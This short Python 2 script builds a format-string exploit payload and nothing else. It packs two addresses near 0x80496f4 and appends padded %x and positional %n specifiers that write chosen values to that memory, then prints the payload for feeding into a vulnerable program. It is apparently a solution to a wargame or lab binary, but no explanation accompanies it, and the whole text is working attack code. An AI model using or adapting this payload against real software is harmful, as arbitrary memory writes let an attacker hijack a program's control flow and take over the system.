import struct
target = struct.pack("I",0x80496f4)
target2 = struct.pack("I",0x80496f4 + 2)
exploit = target + target2 + "%12$21820x" + "%12$n" + "%13$43966x" + "%13$n"
print exploit
